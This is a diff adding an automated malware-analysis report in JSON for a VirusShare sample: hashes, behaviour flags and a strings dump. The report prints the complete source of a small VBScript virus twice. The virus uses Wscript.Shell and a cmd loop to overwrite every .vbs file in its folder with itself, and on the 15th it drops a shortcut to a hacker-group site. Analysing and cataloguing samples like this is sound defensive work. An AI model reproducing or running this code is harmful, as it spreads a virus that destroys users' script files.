@@ -1,0 +1,48 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Chr": "May attempt to obfuscate specific str",
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "Wscript.Shell": "May run an executable file or a system command"
+        },
+        "macro": "Set WshShell = Wscript.CreateObject(\"Wscript.Shell\") \n\nCommandPath = WSHShell.ExpandEnvironmentStrings(\"%comspec%\") \n\nWshShell.Run (CommandPath & \" /c for %%a in (*.vbs) do copy /y \" & Wscript.ScriptFullName & \" %%a >nul\") \n\nIf Day(Now()) = 15 Then \n\nWScript.Echo \"VBSv v1.0\" & Chr(13) & \"by Lord Natas/CodeBreakers\" \n\nSet oUrlLink = WshShell.CreateShortcut(\"The CodeBreakers.URL\") \noUrlLink.TargetPath = \"http://www.codebreakers.org\" \noUrlLink.Save \n\nEnd If "
+    },
+    "filename": "VirusShare_1e42c8d4d9014b7e324997c0ccb22381",
+    "filesize": 473,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1e42c8d4d9014b7e324997c0ccb22381",
+        "sha1": "3d0e613106f6bd7ed2313e45f8c69696cfe08c27",
+        "sha256": "bc068fa4f04b071ee59ff590414799e0bad75410cb5331c496d2e15cc26ee951"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Set WshShell = Wscript.CreateObject(\"Wscript.Shell\") ",
+            "CommandPath = WSHShell.ExpandEnvironmentStrings(\"%comspec%\") ",
+            "WshShell.Run (CommandPath & \" /c for %%a in (*.vbs) do copy /y \" & Wscript.ScriptFullName & \" %%a >nul\") ",
+            "If Day(Now()) = 15 Then ",
+            "WScript.Echo \"VBSv v1.0\" & Chr(13) & \"by Lord Natas/CodeBreakers\" ",
+            "Set oUrlLink = WshShell.CreateShortcut(\"The CodeBreakers.URL\") ",
+            "oUrlLink.TargetPath = \"http://www.codebreakers.org\" ",
+            "oUrlLink.Save ",
+            "End If "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.codebreakers.org"
+        ]
+    },
+    "time": "0:00:00.261712",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
